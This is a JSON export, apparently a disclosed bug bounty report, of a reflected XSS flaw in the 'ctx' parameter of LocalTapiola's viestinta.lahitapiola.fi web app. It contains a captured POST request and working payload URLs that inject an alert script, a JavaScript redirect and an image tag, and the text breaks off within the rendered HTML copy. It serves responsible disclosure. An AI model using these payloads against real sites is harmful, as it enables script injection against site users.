{"id":201137,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDExMzc=","url":"https://hackerone.com/reports/201137","title":"Reflected XSS on iltakoulu_varkaus (viestinta.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-01-25T17:57:15.508Z","submitted_at":"2017-01-25T17:57:15.508Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yonm13","url":"/yonm13","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-06T13:53:51.710Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-04T13:53:29.844Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** The ctx parameter in http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus, can be exploited to perform an XSS Attack.\n\n**Description:** When a user fills the form in the webpage, a POST request is sent to the server with multiple parameters\n```\nPOST /webApp/iltakoulu_varkaus HTTP/1.1\nHost: viestinta.lahitapiola.fi\nContent-Length: 4700\nCache-Control: max-age=0\nOrigin: http://viestinta.lahitapiola.fi\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus\nAccept-Language: en-US,en;q=0.8\nCookie: AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17190%7CMCMID%7C86390830056295906801442850595672988826%7CMCAAMLH-1485781637%7C6%7CMCAAMB-1485871297%7CNRX38WO0n5BH8Th-nqAG_A%7CMCOPTOUT-1485273697s%7CNONE%7CMCAID%7C2C3542A405309EB2-600003002000682B; s_sq=%5B%5BB%5D%5D; __utma=122060566.635463889.1485172763.1485266497.1485266697.3; __utmc=122060566; __utmz=122060566.1485266697.3.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=122060566.|2=Alueyhtio=Iisalmi=1; s_cc=true; uuid230=ba1a1122-1bfa-4b50-87e0-1f5c4b6cb74e; nlid=1e519fb|1c42278e; _ga=GA1.3.635463889.1485172763; ARCSessionInfo=39%7C1485172763414; _ga=GA1.2.635463889.1485172763; vlmref=131698714558516200; googtrans=/fi/en; googtrans=/fi/en\nConnection: close\n\nregistrationLocationId=464570262\u0026webAppLogRcpData_Etunimi=test\u0026webAppLogRcpData_Sukunimi=test\u0026webAppLogRcpData_Yrityksen_nimi_=Test2\u0026webAppLogRcpData_Toimiala=None\u0026webAppLogRcpData_Puhelinnumero=%2B197358661234\u0026webAppLogRcpData_Sahkoposti=tester%40test.com\u0026webAppLogRcpData_Postinumero_=12312333\u0026webAppLogRcpData_Erikoisruokavalio_laktoositon=1\u0026webAppLogRcpData_Erikoisruokavalio_muu=\u0026webAppLogRcpData_Yrityksen_koko=Yksinyritt%C3%A4j%C3%A4\u0026webAppLogRcpData_Kuinka_kauan_olet_toiminut_yrittajana__=yli+5+v\u0026webAppLogRcpData_Yrittajan_ika=alle+30+v\u0026webAppLogRcpData_Elon_asiakas=1\u0026webAppLogRcpData_Oletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_=Kyll%C3%A4\u0026webAppLogRcpData_Tietojani_saa_kayttaa=Ei+ollenkaan.\u0026webAppLogRcpData_Yhteystietojen_kaytto=Kyll%C3%A4\u0026webAppLogRcpData_Ennakkokysymys=%27\u0026webAppLogRcpData_Uutiskirjeentilaus=En\u0026ctx=%3Cctx+lang%3D%22en%22+_target%3D%22web%22+webApp-id%3D%2253976056%22+_folderModel%3D%22nmsRecipient%22+deliveryId%3D%22474097550%22%3E%3CuserInfo+xmlns%3ASOAP-ENV%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22+xmlns%3Ans%3D%22urn%3Axtk%3Asession%22+xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+datakitInDatabase%3D%22true%22+homeDir%3D%22%22+instanceLocale%3D%22en-US%22+locale%3D%22en-US%22+login%3D%22webapp%22+loginCS%3D%22Web+applications+agent+%28webapp%29%22+loginId%3D%223290%22+noConsoleCnx%3D%22true%22+orgUnitId%3D%220%22+theme%3D%22%22+timezone%3D%22Europe%2FHelsinki%22%3E%3Clogin-right+right%3D%22admin%22%2F%3E%3C%2FuserInfo%3E%3Ctimezone+current%3D%22Europe%2FHelsinki%22+changed%3D%22false%22%2F%3E%3Cvars%3E%3CerrorEmail%3E0%3C%2FerrorEmail%3E%3CregularFull%3E0%3C%2FregularFull%3E%3Ceventfull%3E0%3C%2Feventfull%3E%3Cheader%3Ehttp%3A%2F%2Fviestinta.lahitapiola.fi%2Fres%2Ftapiola%2F36d66e62aab33e26a6d6e968b1ce6193.jpg%3C%2Fheader%3E%3Cnoid%3E1%3C%2Fnoid%3E%3Csparebooking%3E0%3C%2Fsparebooking%3E%3CregisteredEmail%3E0%3C%2FregisteredEmail%3E%3Cotsikkoteksti%3E%26lt%3Binput+placeholder%3D%22%22+size%3D%220%22+value%3D%22464570262%22+id%3D%22registrationLocationId%22+name%3D%22registrationLocationId%22+class%3D%22%22+style%3D%22%22+type%3D%22hidden%22+onkeypress%3D%22var+_this%3Dthis%3Breturn+onEnterPressed%28event%2C+function%28%29%7Bdocument.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+_this.value%2C+%27vars_registrationLocationId%27%29%3Breturn+true%3B%7D%29%3B%22+onblur%3D%22document.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+this.value%2C+%27vars_registrationLocationId%27%29%22%2F%26gt%3B%26lt%3BH1+class%3Dhero%26gt%3BVarkaus%26lt%3B%2FH1%26gt%3B%26lt%3BP+class%3Dhero-info%26gt%3B01.03.+17%3A30+-+20%3A30%26lt%3B%2FP%26gt%3B%26lt%3BP+class%3Dhero-place%26gt%3BWarkaus-Sali%2C+Kauppatori+4%26lt%3B%2FP%26gt%3B%3C%2Fotsikkoteksti%3E%3Cpaikkakuntateksti%2F%3E%3Chtml%3E%26lt%3Bscript%26gt%3B%0D%0Afunction+initWebAppPage%28%29%0D%0A%7B%0D%0A%09document.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+%27464570262%27%2C+%27vars_registrationLocationId%27%29%3B%0D%0A%7D%0D%0A%0D%0AjQuery%28function%28%29%0D%0A%7B%0D%0A%09initWebAppPage%28%29%3B%0D%0A%7D%29%3B%0D%0A%26lt%3B%2Fscript%26gt%3B%0D%0A%0D%0A%3C%2Fhtml%3E%3CregistrationLocationId%3E464570262%3C%2FregistrationLocationId%3E%3C%2Fvars%3E%3CactivityHistory%3E%3Cactivity+name%3D%22page%22%2F%3E%3Cactivity+name%3D%22test2%22%2F%3E%3Cactivity+name%3D%22script6%22%2F%3E%3Cactivity+name%3D%22script5%22%2F%3E%3Cactivity+name%3D%22script3%22%2F%3E%3Cactivity+name%3D%22prefill%22%2F%3E%3C%2FactivityHistory%3E%3CwebAppLogRcpData%3E%3CEtunimi%3Etest%3C%2FEtunimi%3E%3CSukunimi%3Etest%3C%2FSukunimi%3E%3CYrityksen_nimi_%3ETest2%3C%2FYrityksen_nimi_%3E%3CToimiala%3ENone%3C%2FToimiala%3E%3CPuhelinnumero%3E%2B197358661234%3C%2FPuhelinnumero%3E%3CSahkoposti%3Etester%40test.com%3C%2FSahkoposti%3E%3CPostinumero_%3E12312333%3C%2FPostinumero_%3E%3CErikoisruokavalio_laktoositon%3E1%3C%2FErikoisruokavalio_laktoositon%3E%3CYrityksen_koko%3EYksinyritt%C3%A4j%C3%A4%3C%2FYrityksen_koko%3E%3CKuinka_kauan_olet_toiminut_yrittajana__%3Eyli+5+v%3C%2FKuinka_kauan_olet_toiminut_yrittajana__%3E%3CYrittajan_ika%3Ealle+30+v%3C%2FYrittajan_ika%3E%3CElon_asiakas%3E1%3C%2FElon_asiakas%3E%3COletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_%3EKyll%C3%A4%3C%2FOletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_%3E%3CTietojani_saa_kayttaa%3EEi+ollenkaan.%3C%2FTietojani_saa_kayttaa%3E%3CYhteystietojen_kaytto%3EKyll%C3%A4%3C%2FYhteystietojen_kaytto%3E%3CEnnakkokysymys%3E%27%3C%2FEnnakkokysymys%3E%3CUutiskirjeentilaus%3EEn%3C%2FUutiskirjeentilaus%3E%3C%2FwebAppLogRcpData%3E%3C%2Fctx%3E\u0026userAction=next\u0026transition=\n```\n\nThe parameter \"HTML\" is translated directly into the Server's response, and can be abused to inject content into the page. \nThe request can be narrowed down, and translated into a GET request via a parameter named 'ctx'\ne.g:\nReflected XSS:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e`\n\nJavascript Redirection (Wait for page to load):\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3blocation.href%3d\"http%3a//google.com\"%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e`\n\nIMG tag injection (at the end of the page):\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e\u003cimg+src%3d\"http%3a//i0.kym-cdn.com/photos/images/newsfeed/000/683/595/a36.jpg\"+/\u003e\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e`\n\n**Domain:** viestinta.lahitapiola.fi\n\n## Browsers / Apps Verified In:\n\n  All Browsers\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Access one of the URLs provided: (What seems like a bug in the Markdown's parsing mechanism was bypassed by adding a tailing '\u003e' to the URLs)\n       - [Javascript Alert](http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\u003e)\n       - [Google.com Redirection](http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3blocation.href%3d\"http%3a//google.com\"%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\u003e)\n       - [IMG Tag injection](http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e\u003cimg+src%3d\"http%3a//i0.kym-cdn.com/photos/images/newsfeed/000/683/595/a36.jpg\"+/\u003e\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\u003e)\n\n## Additional material\n\n  * See attached POCs\n\n## Related reports, best practices\n\n  * [OWASP-recommendations]","vulnerability_information_html":"\u003ch2 id=\"basic-report-information\"\u003eBasic report information\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e The ctx parameter in \u003ca title=\"http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus\" href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2Filtakoulu_varkaus\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, can be exploited to perform an XSS Attack.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e When a user fills the form in the webpage, a POST request is sent to the server with multiple parameters\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /webApp/iltakoulu_varkaus HTTP/1.1\nHost: viestinta.lahitapiola.fi\nContent-Length: 4700\nCache-Control: max-age=0\nOrigin: http://viestinta.lahitapiola.fi\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus\nAccept-Language: en-US,en;q=0.8\nCookie: AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17190%7CMCMID%7C86390830056295906801442850595672988826%7CMCAAMLH-1485781637%7C6%7CMCAAMB-1485871297%7CNRX38WO0n5BH8Th-nqAG_A%7CMCOPTOUT-1485273697s%7CNONE%7CMCAID%7C2C3542A405309EB2-600003002000682B; s_sq=%5B%5BB%5D%5D; __utma=122060566.635463889.1485172763.1485266497.1485266697.3; __utmc=122060566; __utmz=122060566.1485266697.3.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=122060566.|2=Alueyhtio=Iisalmi=1; s_cc=true; uuid230=ba1a1122-1bfa-4b50-87e0-1f5c4b6cb74e; nlid=1e519fb|1c42278e; _ga=GA1.3.635463889.1485172763; ARCSessionInfo=39%7C1485172763414; _ga=GA1.2.635463889.1485172763; vlmref=131698714558516200; googtrans=/fi/en; googtrans=/fi/en\nConnection: close\n\nregistrationLocationId=464570262\u0026amp;webAppLogRcpData_Etunimi=test\u0026amp;webAppLogRcpData_Sukunimi=test\u0026amp;webAppLogRcpData_Yrityksen_nimi_=Test2\u0026amp;webAppLogRcpData_Toimiala=None\u0026amp;webAppLogRcpData_Puhelinnumero=%2B197358661234\u0026amp;webAppLogRcpData_Sahkoposti=tester%40test.com\u0026amp;webAppLogRcpData_Postinumero_=12312333\u0026amp;webAppLogRcpData_Erikoisruokavalio_laktoositon=1\u0026amp;webAppLogRcpData_Erikoisruokavalio_muu=\u0026amp;webAppLogRcpData_Yrityksen_koko=Yksinyritt%C3%A4j%C3%A4\u0026amp;webAppLogRcpData_Kuinka_kauan_olet_toiminut_yrittajana__=yli+5+v\u0026amp;webAppLogRcpData_Yrittajan_ika=alle+30+v\u0026amp;webAppLogRcpData_Elon_asiakas=1\u0026amp;webAppLogRcpData_Oletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_=Kyll%C3%A4\u0026amp;webAppLogRcpData_Tietojani_saa_kayttaa=Ei+ollenkaan.\u0026amp;webAppLogRcpData_Yhteystietojen_kaytto=Kyll%C3%A4\u0026amp;webAppLogRcpData_Ennakkokysymys=%27\u0026amp;webAppLogRcpData_Uutiskirjeentilaus=En\u0026amp;ctx=%3Cctx+lang%3D%22en%22+_target%3D%22web%22+webApp-id%3D%2253976056%22+_folderModel%3D%22nmsRecipient%22+deliveryId%3D%22474097550%22%3E%3CuserInfo+xmlns%3ASOAP-ENV%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22+xmlns%3Ans%3D%22urn%3Axtk%3Asession%22+xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+datakitInDatabase%3D%22true%22+homeDir%3D%22%22+instanceLocale%3D%22en-US%22+locale%3D%22en-US%22+login%3D%22webapp%22+loginCS%3D%22Web+applications+agent+%28webapp%29%22+loginId%3D%223290%22+noConsoleCnx%3D%22true%22+orgUnitId%3D%220%22+theme%3D%22%22+timezone%3D%22Europe%2FHelsinki%22%3E%3Clogin-right+right%3D%22admin%22%2F%3E%3C%2FuserInfo%3E%3Ctimezone+current%3D%22Europe%2FHelsinki%22+changed%3D%22false%22%2F%3E%3Cvars%3E%3CerrorEmail%3E0%3C%2FerrorEmail%3E%3CregularFull%3E0%3C%2FregularFull%3E%3Ceventfull%3E0%3C%2Feventfull%3E%3Cheader%3Ehttp%3A%2F%2Fviestinta.lahitapiola.fi%2Fres%2Ftapiola%2F36d66e62aab33e26a6d6e968b1ce6193.jpg%3C%2Fheader%3E%3Cnoid%3E1%3C%2Fnoid%3E%3Csparebooking%3E0%3C%2Fsparebooking%3E%3CregisteredEmail%3E0%3C%2FregisteredEmail%3E%3Cotsikkoteksti%3E%26lt%3Binput+placeholder%3D%22%22+size%3D%220%22+value%3D%22464570262%22+id%3D%22registrationLocationId%22+name%3D%22registrationLocationId%22+class%3D%22%22+style%3D%22%22+type%3D%22hidden%22+onkeypress%3D%22var+_this%3Dthis%3Breturn+onEnterPressed%28event%2C+function%28%29%7Bdocument.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+_this.value%2C+%27vars_registrationLocationId%27%29%3Breturn+true%3B%7D%29%3B%22+onblur%3D%22document.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+this.value%2C+%27vars_registrationLocationId%27%29%22%2F%26gt%3B%26lt%3BH1+class%3Dhero%26gt%3BVarkaus%26lt%3B%2FH1%26gt%3B%26lt%3BP+class%3Dhero-info%26gt%3B01.03.+17%3A30+-+20%3A30%26lt%3B%2FP%26gt%3B%26lt%3BP+class%3Dhero-place%26gt%3BWarkaus-Sali%2C+Kauppatori+4%26lt%3B%2FP%26gt%3B%3C%2Fotsikkoteksti%3E%3Cpaikkakuntateksti%2F%3E%3Chtml%3E%26lt%3Bscript%26gt%3B%0D%0Afunction+initWebAppPage%28%29%0D%0A%7B%0D%0A%09document.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+%27464570262%27%2C+%27vars_registrationLocationId%27%29%3B%0D%0A%7D%0D%0A%0D%0AjQuery%28function%28%29%0D%0A%7B%0D%0A%09initWebAppPage%28%29%3B%0D%0A%7D%29%3B%0D%0A%26lt%3B%2Fscript%26gt%3B%0D%0A%0D%0A%3C%2Fhtml%3E%3CregistrationLocationId%3E464570262%3C%2FregistrationLocationId%3E%3C%2Fvars%3E%3CactivityHistory%3E%3Cactivity+name%3D%22page%22%2F%3E%3Cactivity+name%3D%22test2%22%2F%3E%3Cactivity+name%3D%22script6%22%2F%3E%3Cactivity+name%3D%22script5%22%2F%3E%3Cactivity+name%3D%22script3%22%2F%3E%3Cactivity+name%3D%22prefill%22%2F%3E%3C%2FactivityHistory%3E%3CwebAppLogRcpData%3E%3CEtunimi%3Etest%3C%2FEtunimi%3E%3CSukunimi%3Etest%3C%2FSukunimi%3E%3CYrityksen_nimi_%3ETest2%3C%2FYrityksen_nimi_%3E%3CToimiala%3ENone%3C%2FToimiala%3E%3CPuhelinnumero%3E%2B197358661234%3C%2FPuhelinnumero%3E%3CSahkoposti%3Etester%40test.com%3C%2FSahkoposti%3E%3CPostinumero_%3E12312333%3C%2FPostinumero_%3E%3CErikoisruokavalio_laktoositon%3E1%3C%2FErikoisruokavalio_laktoositon%3E%3CYrityksen_koko%3EYksinyritt%C3%A4j%C3%A4%3C%2FYrityksen_koko%3E%3CKuinka_kauan_olet_toiminut_yrittajana__%3Eyli+5+v%3C%2FKuinka_kauan_olet_toiminut_yrittajana__%3E%3CYrittajan_ika%3Ealle+30+v%3C%2FYrittajan_ika%3E%3CElon_asiakas%3E1%3C%2FElon_asiakas%3E%3COletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_%3EKyll%C3%A4%3C%2FOletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_%3E%3CTietojani_saa_kayttaa%3EEi+ollenkaan.%3C%2FTietojani_saa_kayttaa%3E%3CYhteystietojen_kaytto%3EKyll%C3%A4%3C%2FYhteystietojen_kaytto%3E%3CEnnakkokysymys%3E%27%3C%2FEnnakkokysymys%3E%3CUutiskirjeentilaus%3EEn%3C%2FUutiskirjeentilaus%3E%3C%2FwebAppLogRcpData%3E%3C%2Fctx%3E\u0026amp;userAction=next\u0026amp;transition=\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe parameter \u0026quot;HTML\u0026quot; is translated directly into the Server\u0026#39;s response, and can be abused to inject content into the page. \u003cbr\u003e\nThe request can be narrowed down, and translated into a GET request via a parameter named \u0026#39;ctx\u0026#39;\u003cbr\u003e\ne.g:\u003cbr\u003e\nReflected XSS:\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u0026lt;ctx\u0026gt;\u0026lt;vars\u0026gt;\u0026lt;html\u0026gt;%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b\u0026lt;/html\u0026gt;\u0026lt;/vars\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity+name%3d\u0026quot;page\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;test2\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script6\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script5\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script3\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;prefill\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;/ctx\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eJavascript Redirection (Wait for page to load):\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u0026lt;ctx\u0026gt;\u0026lt;vars\u0026gt;\u0026lt;html\u0026gt;%26lt%3bscript%26gt%3blocation.href%3d\u0026quot;http%3a//google.com\u0026quot;%3b%26lt%3b/script%26gt%3b\u0026lt;/html\u0026gt;\u0026lt;/vars\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity+name%3d\u0026quot;page\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;test2\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script6\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script5\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script3\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;prefill\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;/ctx\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eIMG tag injection (at the end of the page):\u003cbr\u003e\n\u003ccode\u003ehttp://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u0026lt;ctx\u0026gt;\u0026lt;vars\u0026gt;\u0026lt;html\u0026gt;\u0026lt;img+src%3d\u0026quot;http%3a//i0.kym-cdn.com/photos/images/newsfeed/000/683/595/a36.jpg\u0026quot;+/\u0026gt;\u0026lt;/html\u0026gt;\u0026lt;/vars\u0026gt;\u0026lt;activityHistory\u0026gt;\u0026lt;activity+name%3d\u0026quot;page\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;test2\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script6\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script5\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;script3\u0026quot;/\u0026gt;\u0026lt;activity+name%3d\u0026quot;prefill\u0026quot;/\u0026gt;\u0026lt;/activityHistory\u0026gt;\u0026lt;/ctx\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDomain:\u003c/strong\u003e viestinta.lahitapiola.fi\u003c/p\u003e\n\n\u003ch2 id=\"browsers-apps-verified-in\"\u003eBrowsers / Apps Verified In:\u003c/h2\u003e\n\n\u003cp\u003eAll Browsers\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e(Add details for how we can reproduce the issue)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAccess one of the URLs provided: (What seems like a bug in the Markdown\u0026#39;s parsing mechanism was bypassed by adding a tailing \u0026#39;\u0026gt;\u0026#39; to the URLs)\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fviestinta.lahitapiola.fi%2FwebApp%2Filtakoulu_varkaus%3Fctx%3D%253Cctx%253E%253Cvars%253E%253Chtml%253E%2526lt%253bscript%2526gt%253balert%28%29%253B%253b%2526lt%253b%2Fscript%2526gt%253b%253C%2Fhtml%253E%253C%2Fvars%253E%253CactivityHistory%253E%253Cactivity%2Bname%253d%2522page%2522%2F%253E%253Cactivity%2Bname%253d%2522test2%2522%2F%253E%253Cactivity%2Bname%253d%2522script6%2522%2F%253E%253Cactivity%2Bname%253d%2522script5%2522%2F%253E%253Cactivity%2Bname%253d%2522script3%2522%2F%253E%253Cactivity%2Bname%253d%2522prefill%2522%2F%253E%253C%2FactivityHistory%253E%253C%2Fctx%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJavascript Alert\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca 